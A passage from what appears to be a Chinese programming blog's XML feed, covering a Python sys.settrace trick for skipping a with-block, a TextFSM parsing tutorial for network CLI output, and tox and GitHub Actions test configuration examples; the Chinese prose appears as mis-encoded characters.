title="åˆ©ç”¨ç‰¹æ®Šçš„ç±»"></a>åˆ©ç”¨ç‰¹æ®Šçš„ç±»</h3><p>ä¸Šé¢çš„è£…é¥°å™¨å…¶å®å¹¶ä¸å¥½ç”¨ï¼Œå¦ä¸€ç§æ–¹æ³•å½“éœ€è¦è·³è¿‡çš„æ—¶å€™ï¼Œè¿”å›ä¸€ä¸ªç‰¹æ®Šç±»ã€‚</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search_cmd</span>(<span class="hljs-params">cmd=<span class="hljs-literal">None</span></span>) -&gt; Cmd:</span></span><span class="line">    <span class="hljs-keyword">if</span> cmd:</span><span class="line">        <span class="hljs-keyword">return</span> Cmd </span><span class="line">    <span class="hljs-keyword">return</span> NoneSkip()</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SkipWithBlock</span>(<span class="hljs-params">Exception</span>):</span></span><span class="line">    <span class="hljs-keyword">pass</span></span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;å•ä¾‹ç±»ç»§æ‰¿&quot;&quot;&quot;</span></span><span class="line">    _instance = <span class="hljs-literal">None</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__new__</span>(<span class="hljs-params">class_, *args, **kwargs</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(class_._instance, class_):</span><span class="line">            class_._instance = <span class="hljs-built_in">object</span>.__new__(class_, *args, **kwargs)</span><span class="line">        <span class="hljs-keyword">return</span> class_._instance</span><span class="line"></br></span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NoneSkip</span>(<span class="hljs-params">Singleton</span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-string">    ç®€å•æ¨¡ä»¿Noneç±»ï¼Œä½†æ˜¯å¯ä»¥ç”¨æ¥ä½œä¸º-with-ä¸­çš„è·³è¿‡</span></span><span class="line"><span class="hljs-string">    ä½¿ç”¨bool()æ¥åˆ¤æ–­æ˜¯å¦ä¸ºç©º</span></span><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.none = <span class="hljs-literal">None</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__enter__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> sys.gettrace():</span><span class="line">            <span class="hljs-keyword">return</span> self</span><span class="line"></br></span><span class="line">        <span class="hljs-comment"># NOTE å­˜åœ¨ä¸€å®šçš„é—®é¢˜ï¼Œå½“ç¨‹åºå¤„äºè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œè°ƒè¯•è¿›ç¨‹ä¼šè¢«ç ´åï¼š</span></span><span class="line">        <span class="hljs-comment"># https://pydev.blogspot.com/2007/06/why-cant-pydev-debugger-work-with.html</span></span><span class="line">        sys.settrace(<span class="hljs-keyword">lambda</span> *args, **keys: <span class="hljs-literal">None</span>)</span><span class="line">        frame = sys._getframe(<span class="hljs-number">1</span>)</span><span class="line">        frame.f_trace = self.trace</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">trace</span>(<span class="hljs-params">self, frame, event, arg</span>):</span></span><span class="line">        <span class="hljs-keyword">raise</span> SkipWithBlock()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__bool__</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__exit__</span>(<span class="hljs-params">self, <span class="hljs-built_in">type</span>, value, traceback</span>):</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:</span><span class="line">            <span class="hljs-keyword">return</span>  <span class="hljs-comment"># No exception</span></span><span class="line">        <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>, SkipWithBlock):</span><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># Suppress special SkipWithBlock exception</span></span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__eq__</span>(<span class="hljs-params">self, other</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> self.none == other</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__ne__</span>(<span class="hljs-params">self, other</span>):</span></span><span class="line">        <span class="hljs-keyword">return</span> self.none != other</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__getattr__</span>(<span class="hljs-params">self, __name: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">        <span class="hljs-comment"># NOTE å½“è°ƒç”¨ä¸å­˜åœ¨çš„å±æ€§æ—¶ï¼Œå°±æ˜¯è§¦å‘è¿™ä¸ªï¼Œè·³è¿‡-with-åé¢çš„å†…å®¹</span></span><span class="line">        <span class="hljs-keyword">raise</span> SkipWithBlock()</span></code></pre></div></div><p>è¿™é‡Œå…¶å®ä½¿ç”¨äº†ä¸¤ç§è·³è¿‡æ–¹å¼ï¼š</p><ol><li><code>frame.f_trace = self.trace</code> è¿™ç§æ–¹å¼æ˜¯ç›´æ¥è·³è¿‡ï¼Œä¸ä¼šè°ƒç”¨å‡½æ•°çš„å†…éƒ¨ä»£ç </li><li><code>__getattr__</code>ä¸­raise SkipWithBlock() è¿™ç§æ–¹å¼æ˜¯è°ƒç”¨å‡½æ•°çš„å†…éƒ¨ä»£ç ï¼Œä½†æ˜¯ä¸€æ—¦é‡åˆ°æ‰§è¡Œäº†VARçš„æ–¹æ³•åé¢çš„å†…å®¹å°±ä¼šè¢«è·³è¿‡ã€‚</li></ol><p>é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åšä¸¤ä¸ªå‘¢ï¼Ÿ<br>å› ä¸ºå¦‚æœä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´è°ƒè¯•å™¨æ— æ³•è·Ÿè¸ªåˆ°å‡½æ•°çš„å†…éƒ¨ä»£ç ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´è°ƒè¯•å™¨æ— æ³•è·Ÿè¸ªåˆ°ç¨‹åºåé¢çš„ä»£ç ã€‚<br>è€Œç¬¬äºŒç§æ–¹æ³•ï¼Œå¯ä»¥è·Ÿè¸ªåˆ°å‡½æ•°çš„å†…éƒ¨ä»£ç ï¼Œä½†æ˜¯ä¼šæ‰§è¡Œå‰é¢ä¸€éƒ¨åˆ†çš„ä»£ç ã€‚</p><p>æ‰€ä»¥ä¼šæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œå½“ä¸å¤„äºè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œä½¿ç”¨ç¬¬ä¸€ç§æ–¹å¼ã€‚<br>å½“å¤„äºè°ƒè¯•çŠ¶æ€çš„æ—¶å€™ï¼Œä½¿ç”¨ç¬¬äºŒç§æ–¹å¼ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python é­”æ³•æ–¹æ³•</title>
      <link href="/2022/08/16/python-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95/"/>
      <url>/2022/08/16/python-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/2022/08/16/python-%E9%AD%94%E6%B3%95%E6%96%B9%E6%B3%95/1.png"></p><ul><li><a href="https://rszalski.github.io/magicmethods/">A Guide to Pythonâ€™s Magic Methods</a></li><li><a href="https://segmentfault.com/a/1190000040286979">python é­”æ³•æ–¹æ³•é•¿æ–‡è¯¦è§£</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TextFSM ä½¿ç”¨æ–¹æ³•</title>
      <link href="/2022/06/23/TextFSM-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/06/23/TextFSM-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>ç½‘ç»œå·¥ç¨‹å¸ˆå¾€å¾€éœ€è¦ä½¿ç”¨è‡ªåŠ¨åŒ–çš„å¤„ç†å·¥å…·æ¥å‡è½»è´Ÿæ‹…ã€‚å…¶ä¸­å¯¹CLIçš„è¾“å‡ºè¿›è¡Œè§£æç„¶åè·å–æœ‰æ•ˆä¿¡æ¯å°±æ˜¯å…¶ä¸­çš„è‡ªåŠ¨åŒ–çš„å…³é”®ã€‚</p><p><a href="https://github.com/google/textfsm">TextFSM</a>æ˜¯Googleå‘èµ·çš„å¼€æºé¡¹ç›®, å®ƒçš„å®˜æ–¹ä»‹ç»<a href="https://github.com/google/textfsm/wiki">Wiki</a>é‡Œé¢ä»‹ç»äº†å‡ ä¸ªåŸºæœ¬ä½¿ç”¨æ–¹å¼ã€‚</p><p><a href="https://pyneng.readthedocs.io/en/latest/book/21_textfsm/textfsm_examples.html">è¿™é‡Œ</a>æ˜¯è‹±æ–‡å¯¹ç½‘ç»œå·¥ç¨‹å¸ˆè‡ªåŠ¨åŒ–çš„ä¸€äº›ä»‹ç»ã€‚ä¹Ÿæœ‰ä¸€äº›TextFSMçš„ä½¿ç”¨æ¡ˆä¾‹å’Œä»‹ç»ã€‚</p><p>æ›´å¤šçš„ä½¿ç”¨æ¡ˆä¾‹åœ¨<a href="https://github.com/Elinpf/ntc-templates">ntc-templates</a>é‡Œé¢</p><h2 id="è¯­æ³•ä»‹ç»"><a href="#è¯­æ³•ä»‹ç»" class="headerlink" title="è¯­æ³•ä»‹ç»"></a>è¯­æ³•ä»‹ç»</h2><p>æ–‡ä»¶åç¼€åç§°ä¸º <code>.textfsm</code></p><p>æ–‡ä»¶æœ€åŸºæœ¬çš„å½¢æ€</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-pgsql codeBlockLines"><span class="line"><span class="hljs-keyword">Value</span> <span class="hljs-type">name</span> regex</span><span class="line"></br></span><span class="line"><span class="hljs-keyword">Start</span></span><span class="line">  ^<span class="hljs-keyword">Rule</span></span></code></pre></div></div><p>å…¶ä¸­<code>Value</code>çš„æ ¼å¼å¦‚ä¸‹</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-xquery codeBlockLines"><span class="line">Value [<span class="hljs-keyword">option</span>,[<span class="hljs-keyword">option</span>...]]<span class="hljs-built_in"> name</span> regex</span></code></pre></div></div><ul><li><p>Value ä»£è¡¨çš„æ˜¯å®šä¹‰åç§°ï¼Œå¿…é¡»çš„</p></li><li><p>Options</p><ul><li><code>Filldown</code> å‘ä¸‹ä¿ç•™, å¦‚æœRecordçš„æ—¶å€™Valueçš„å€¼ä¸ºç©ºï¼Œé‚£ä¹ˆå°±å–ä¸Šä¸€ä¸ªRecordä¸­çš„å€¼</li><li><code>Fillup</code> å‘ä¸Šä¿ç•™, å¦‚æœRecordçš„æ—¶å€™Valueå€¼ä¸ºç©ºï¼Œé‚£ä¹ˆå°±å–ä¸‹ä¸€ä¸ªRecordä¸­çš„å€¼</li><li><code>Required</code> è¡¨ç¤ºä¸ºå¿…é¡»å€¼ï¼Œå¦‚æœæ²¡æœ‰å°±ä¸ä¼šè®°å½•</li><li><code>List</code> ä»£è¡¨Valueæ˜¯æ•°ç»„ç±»å‹</li><li><code>Key</code> æ²¡å•¥ç”¨</li></ul></li><li><p>name åç§°ä½¿ç”¨å¤§å†™åŠ ä¸‹åˆ’çº¿</p></li><li><p>regex è¦è·å–çš„æ­£åˆ™è¡¨è¾¾å¼</p></li></ul><p><code>Start</code>æ˜¯çŠ¶æ€æœºçš„èµ·å§‹ï¼Œå¿…é¡»è¦æœ‰ï¼Œå¯¹åº”çš„<code>EOF</code>æ˜¯æ–‡ä»¶çš„æœ«å°¾ï¼Œå¯ä»¥éšè—æ‰ã€‚</p><p><code>Rule</code> å¿…é¡»ä»¥ä¸¤ä¸ªç©ºæ ¼åŠ ä¸€ä¸ª<code>^</code>å¼€å¤´ä½œä¸ºèµ·å§‹ï¼Œæ˜¯å¯¹å•è¡Œçš„æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…,è¦åŒ¹é…çš„Valueå€¼ç”¨<code>$&#123;name&#125;</code>çš„æ–¹å¼åŒ…å«ã€‚</p><p>Ruleçš„ç»“å°¾å¯ä»¥ç”¨<code> -&gt; Action</code> çš„æ–¹å¼ç»™å‡ºå¯¹åº”çš„åŠ¨ä½œï¼Œè¿™ä¸ªåœ¨åŸæ–‡ä¸­å«åš<code>Action in rules</code></p><p><code>Action</code> æœ‰ä¸‰ç§:</p><ul><li><code>L - Line Action</code> å¯¹inputè¾“å…¥çš„åŠ¨ä½œ</li><li><code>R - Record Action</code>  å¯¹è®°å½•çš„åŠ¨ä½œ</li><li><code>S - State Transition</code> å¯¹çŠ¶æ€çš„è½¬è¡Œ</li></ul><p>ä»–ä»¬çš„è¿æ¥æ–¹å¼æ˜¯ <code>-&gt; L.R S</code></p><h3 id="Line-Action"><a href="#Line-Action" class="headerlink" title="Line Action"></a>Line Action</h3><p>Line Action åŒ…å«ä¸¤ä¸ªåŠ¨ä½œï¼š</p><ul><li><code>Next</code>  è¿™ä¸ªæ˜¯é»˜è®¤åŠ¨ä½œï¼Œè¡¨ç¤ºè¯»å–è¯»å–ä¸‹ä¸€è¡Œï¼Œå¹¶ä¸”ä»æ­¤çŠ¶æ€æœºçš„å¤´éƒ¨å¼€å§‹é‡æ–°åŒ¹é…</li><li><code>Continue</code>  è¿™ä¸ªåŠ¨ä½œè¡¨ç¤ºä¾æ—§ä¿ç•™è¿™ä¸€è¡Œçš„è¯»å–çŠ¶æ€ï¼Œå¹¶ä¸”ç»§ç»­ä¸‹ä¸€æ¡Ruleçš„åŒ¹é…</li></ul><p>å…¶å®å°±æ˜¯<code>Next</code>ä»å¤´å¼€å§‹åŒ¹é…ä¸‹ä¸€è¡Œï¼Œ<code>Continue</code>æ˜¯å¯¹åŒ¹é…äº†çš„ç»§ç»­å¾€ä¸‹èµ°</p><h3 id="Record-Action"><a href="#Record-Action" class="headerlink" title="Record Action"></a>Record Action</h3><p>Record Action åŒ…å«äº†å››ä¸ªåŠ¨ä½œ</p><ul><li><code>NoRecord</code> é»˜è®¤åŠ¨ä½œï¼Œ ä¸åšè®°å½•</li><li><code>Record</code> æ‰€æœ‰å€¼è¢«è®°å½•å†™å…¥ä¸‹æ¥ï¼Œç„¶åè¿›å…¥ä¸‹ä¸€æ¡è®°å½•</li><li><code>Clear</code> æ¸…ç†æ‰é™¤ Filldown çš„æ‰€æœ‰å€¼</li><li><code>Clearall</code> æ¸…ç†æ‰æ‰€æœ‰å€¼</li></ul><h3 id="State-Transition"><a href="#State-Transition" class="headerlink" title="State Transition"></a>State Transition</h3><p>æ”¹å˜çŠ¶æ€æœº</p><p>å½“åŒ¹é…åˆ°ä¹‹åï¼Œä¸‹ä¸€æ¡å°†ä¼šåˆ°è½¬åˆ°å¯¹åº”çš„çŠ¶æ€ä¸‹ï¼Œå¹¶ä¸”åœ¨è¿™ä¸ªçŠ¶æ€ä¸‹é‡å¤ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯çŠ¶æ€ä¸èƒ½ä¸ <code>Continue</code>è¿ç”¨ã€‚</p><h3 id="Error-Action"><a href="#Error-Action" class="headerlink" title="Error Action"></a>Error Action</h3><p>è¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ Error Actionï¼Œå®ƒä¼šåœæ­¢å¹¶ä¸”æŠ›å‡ºå¼‚å¸¸<code>textfsm.parser.TextFSMError</code></p><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-livescript codeBlockLines"><span class="line">^regex -&gt; <span class="hljs-built_in">Error</span> [word|<span class="hljs-string">&quot;string&quot;</span>]</span></code></pre></div></div><h2 id="å¸¸ç”¨å†™æ³•"><a href="#å¸¸ç”¨å†™æ³•" class="headerlink" title="å¸¸ç”¨å†™æ³•"></a>å¸¸ç”¨å†™æ³•</h2><p>todo</p><h3 id="åªæœ‰éœ€è¦å•ä¸€æ¡ç›®"><a href="#åªæœ‰éœ€è¦å•ä¸€æ¡ç›®" class="headerlink" title="åªæœ‰éœ€è¦å•ä¸€æ¡ç›®"></a>åªæœ‰éœ€è¦å•ä¸€æ¡ç›®</h3><p>å¯¹äºåªéœ€è¦ä¸€æ¡è®°å½•å°±å¯ä»¥è§£å†³çš„é—®é¢˜</p><h3 id="å¤šæ¡è®°å½•"><a href="#å¤šæ¡è®°å½•" class="headerlink" title="å¤šæ¡è®°å½•"></a>å¤šæ¡è®°å½•</h3><h3 id="æ•°ç»„è®°å½•"><a href="#æ•°ç»„è®°å½•" class="headerlink" title="æ•°ç»„è®°å½•"></a>æ•°ç»„è®°å½•</h3><p>TODO</p><h3 id="ä¸è§„åˆ™è®°å½•"><a href="#ä¸è§„åˆ™è®°å½•" class="headerlink" title="ä¸è§„åˆ™è®°å½•"></a>ä¸è§„åˆ™è®°å½•</h3><p>æœ‰çŠ¶æ€è½¬ç§»ï¼Œå¹¶ä¸”æ˜¯æœ€åä¸€å—ï¼ŒçŠ¶æ€è½¬ç§»ä¹Ÿä¸æ˜¯å¿…é¡»çš„ï¼Œæ¯”å¦‚ä¸‹é¢çš„æƒ…å†µï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">GigabitEthernet0/0/1 has 1 neighbors:</span><span class="line"></br></span><span class="line">Neighbor index : 1</span><span class="line">Chassis type :macAddress</span><span class="line">Chassis ID :f55f-c2c5-e180</span><span class="line">MED Device information</span><span class="line">    SoftwareRev :12.2(55)SE7</span><span class="line">    Model name :WS-C2960S-48LPS-L</span><span class="line">GigabitEthernet0/0/2 has 1 neighbors:</span><span class="line"></br></span><span class="line">Neighbor index : 1</span><span class="line">Chassis type :macAddress</span><span class="line">Chassis ID :f55f-c2c5-e180</span><span class="line">GigabitEthernet0/0/3 has 1 neighbors:</span><span class="line"></br></span><span class="line">Neighbor index : 1</span><span class="line">Chassis type :macAddress</span><span class="line">Chassis ID :f55f-c2c5-e180</span><span class="line">MED Device information</span><span class="line">    SoftwareRev :12.2(55)SE7</span><span class="line">    Model name :WS-C2960S-48LPS-L</span></code></pre></div></div><p>é‚£ä¹ˆå¯ä»¥é€šè¿‡æ¥å£é‚£ä¸€è¡Œæ¥è®°å½•ï¼Œå¹¶ä¸”<code>Continue</code>ç„¶åå†è®°å½•ä¸‹ç°åœ¨çš„æ¥å£åç§°</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">Value INTF (\S+)</span><span class="line">Value NUM (\d+)</span><span class="line">Value MED (\S+)</span><span class="line"></br></span><span class="line">Start</span><span class="line">  ^.* has \d+ neighbors: -&gt; Continue.Record</span><span class="line">  ^$&#123;INTF&#125; has $&#123;NUM&#125;</span><span class="line">  $MED Device -&gt; Med</span><span class="line"></br></span><span class="line">Med</span><span class="line">  ^\s+Model name\s+:$&#123;MED&#125; -&gt; Start</span></code></pre></div></div><p>å¾ˆå·§å¦™çš„é€†å‘æ€ç»´ã€‚</p><h3 id="è½¬ç§»çŠ¶æ€æ—¢è¦è®°å½•åˆè¦è½¬ç§»"><a href="#è½¬ç§»çŠ¶æ€æ—¢è¦è®°å½•åˆè¦è½¬ç§»" class="headerlink" title="è½¬ç§»çŠ¶æ€æ—¢è¦è®°å½•åˆè¦è½¬ç§»"></a>è½¬ç§»çŠ¶æ€æ—¢è¦è®°å½•åˆè¦è½¬ç§»</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">System Power Information (Power 1 - OFFLINE)</span><span class="line">----------------------------------------------------------------</span><span class="line">System Power Information (Power 2 - ONLINE)</span><span class="line">----------------------------------------------------------------</span><span class="line">Status: Online</span><span class="line">Description:</span><span class="line">Work Status: Normal</span><span class="line">Power in: Normal</span></code></pre></div></div><p>æ¯”å¦‚è¿™ä¸ªä¾‹å­ï¼Œéœ€è¦é€šè¿‡çŠ¶æ€è½¬ç§»æ¥è®°å½•ï¼Œä½†æ˜¯åˆéœ€è¦è®°å½•çŠ¶æ€è½¬ç§»çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡<code>Continue</code>æ¥å®ç°</p><p>ä»¥ä¸‹textfsmä¸ºç®€åŒ–åçš„ç¤ºä¾‹ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">Value POWER_ID (\d+)</span><span class="line">Value STATUS (\w+)</span><span class="line">Value DESCRIPTION (\S+)</span><span class="line">Value WORK_STATUS (\S+)</span><span class="line">Value POWER_IN (\S+)</span><span class="line"></br></span><span class="line">Start</span><span class="line">  ^System\s+Power\s+Information\s+\(Power\s+$&#123;POWER_ID&#125;\s+-\s+$&#123;STATUS&#125;\) -&gt; Long_Power_Info</span><span class="line"></br></span><span class="line">Long_Power_Info</span><span class="line">  ^System\s+Power -&gt; Continue.Record</span><span class="line">  ^System\s+Power\s+Information\s+\(Power\s+$&#123;POWER_ID&#125;\s+-\s+$&#123;STATUS&#125;\)</span><span class="line">  ^\s*Description:\s+$&#123;DESCRIPTION&#125;</span><span class="line">  ^\s*Work\s+Status:\s+$&#123;WORK_STATUS&#125;</span><span class="line">  ^\s*Power\s+in:\s+$&#123;POWER_IN&#125; -&gt; Record Start</span></code></pre></div></div><p>é€šè¿‡åœ¨çŠ¶æ€é‡Œé¢çš„<code>Continue.Record</code>æ¥å®ç°</p>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
        <tags>
            
            <tag> todo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python tox ä»»åŠ¡è‡ªåŠ¨åŒ–å·¥å…·ä½¿ç”¨æ–¹æ³•</title>
      <link href="/2022/06/21/python-tox-%E4%BB%BB%E5%8A%A1%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2022/06/21/python-tox-%E4%BB%BB%E5%8A%A1%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tox.wiki/en/latest/">tox</a> æ˜¯å¯¹ä»»åŠ¡è¿›è¡Œè‡ªåŠ¨åŒ–çš„å·¥å…·ã€‚</p><p>å¹³å¸¸æµ‹è¯•çš„æ—¶å€™ï¼Œå¦‚æœåªæ˜¯å•ä¸€çš„æµ‹è¯•ï¼Œæ¯”å¦‚åªæœ‰pytestï¼Œè¿™æ ·è¿˜å¥½ã€‚<br>ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å¤špythonç‰ˆæœ¬ï¼Œå¤šä¸ªæµ‹è¯•å†…å®¹ï¼Œæ¯”å¦‚æ¶‰åŠ blackã€ flake8ã€ yamllint è¿™äº›ï¼Œé‚£ä¹ˆä¸€æ¬¡æ¬¡çš„æµ‹è¯•å°±ä¼šå¾ˆéº»çƒ¦äº†ã€‚</p><p>è¿™æ—¶å°±è¦ç”¨åˆ°tox</p><p>toxä¾èµ–äºé¡¹ç›®æ–‡ä»¶å¤¹ä¸­çš„<code>tox.ini</code>é…ç½®æ–‡ä»¶è¿è¡Œ, <a href="https://tox.wiki/en/latest/config.html">tox config</a></p><h2 id="åŸºç¡€ä¾‹å­"><a href="#åŸºç¡€ä¾‹å­" class="headerlink" title="åŸºç¡€ä¾‹å­"></a>åŸºç¡€ä¾‹å­</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-section">[tox]</span></span><span class="line"><span class="hljs-attr">isolated_build</span> = <span class="hljs-literal">True</span></span><span class="line"><span class="hljs-attr">envlist</span> = py38,black,flake8,yamllint</span><span class="line"><span class="hljs-attr">skip_missing_interpreters</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">download</span> = <span class="hljs-literal">true</span></span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv]</span></span><span class="line"><span class="hljs-attr">passenv</span> = TRAVIS TRAVIS_*</span><span class="line"><span class="hljs-attr">whitelist_externals</span> = poetry</span><span class="line"><span class="hljs-attr">deps</span> = poetry</span><span class="line"><span class="hljs-attr">commands</span> =</span><span class="line">    poetry install </span><span class="line">    python -m pytest &#123;posargs&#125;</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:black]</span></span><span class="line"><span class="hljs-attr">deps</span> = black</span><span class="line"><span class="hljs-attr">commands</span> = black ./ --diff --check</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:flake8]</span></span><span class="line"><span class="hljs-attr">deps</span> = flake8</span><span class="line"><span class="hljs-attr">commands</span> = flake8 ./</span><span class="line"></br></span><span class="line"><span class="hljs-section">[testenv:yamllint]</span></span><span class="line"><span class="hljs-attr">deps</span> = yamllint</span><span class="line"><span class="hljs-attr">commands</span> = yamllint ./</span><span class="line"></br></span><span class="line"><span class="hljs-section">[flake8]</span></span><span class="line"><span class="hljs-comment"># Line length managed by black</span></span><span class="line"><span class="hljs-attr">ignore</span> = E501</span><span class="line"><span class="hljs-attr">exclude</span> = .git,.tox,.venv,venv</span></code></pre></div></div><p>Action:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-yaml codeBlockLines"><span class="line"><span class="hljs-attr">name:</span> <span class="hljs-string">Check</span> <span class="hljs-string">Templates</span></span><span class="line"></br></span><span class="line"><span class="hljs-attr">on:</span> [<span class="hljs-string">push</span>, <span class="hljs-string">pull_request</span>]</span><span class="line"></br></span><span class="line"><span class="hljs-attr">jobs:</span></span><span class="line">  <span class="hljs-attr">check:</span></span><span class="line">    <span class="hljs-attr">runs-on:</span> <span class="hljs-string">ubuntu-latest</span></span><span class="line"></br></span><span class="line">    <span class="hljs-attr">steps:</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/checkout@v2</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Setup</span> <span class="hljs-string">Python</span></span><span class="line">      <span class="hljs-attr">uses:</span> <span class="hljs-string">actions/setup-python@v2</span></span><span class="line">      <span class="hljs-attr">with:</span></span><span class="line">        <span class="hljs-attr">python-version:</span> <span class="hljs-string">&#x27;3.8&#x27;</span></span><span class="line">    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Install</span> <span class="hljs-string">Dependencies</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line"><span class="hljs-string">        python -m pip install --upgrade pip</span></span><span class="line"><span class="hljs-string">        pip install poetry</span></span><span class="line"><span class="hljs-string">        poetry install</span></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">Run</span> <span class="hljs-string">Scripts</span></span><span class="line">      <span class="hljs-attr">run:</span> <span class="hljs-string">|</span></span><span class="line">        <span class="hljs-string">poetry</span> <span class="hljs-string">run</span> <span class="hljs-string">tox</span></span></code></pre></div></div><h2 id="é«˜çº§ä¾‹å­"><a href="#é«˜çº§ä¾‹å­" class="headerlink" title="é«˜çº§ä¾‹å­"></a>é«˜çº§ä¾‹å­</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-ini codeBlockLines"><span class="line"><span class="hljs-section">[tox]</span></span><span class="line"><span class="hljs-attr">envlist</span> =</span><span class="line">    fix_lint</span><span class="line">    py310</span><span class="line">    py39</span><span class="line">    py38</span><span class="line">    py37</span><span class="line">    py36</span><span class="line">    py35</span><span class="line">    py27</span><span class="line">    pypy3</span><span class="line">    pypy</span><span class="line">    coverage</span><span class="line">    docs</span><span class="line">    readme</span><span class="line"><span class="hljs-attr">isolated_build</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">skip_missing_interpreters</span> = <span class="hljs-literal">true</span></span><span class="line"><span class="hljs-attr">minversion</span> = <span 